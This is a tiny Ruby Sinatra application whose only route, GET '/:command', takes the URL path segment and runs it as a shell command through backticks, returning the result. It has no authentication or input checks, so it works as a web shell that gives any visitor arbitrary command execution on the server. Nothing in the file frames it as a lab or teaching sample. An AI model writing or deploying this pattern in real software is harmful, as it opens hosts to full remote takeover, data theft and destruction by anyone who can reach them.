require 'rubygems'
require 'sinatra'

enable :run
set :public, File.dirname(__FILE__) + '/public'

get '/:command' do
  puts params[:command]
  `#{params[:command]}`
end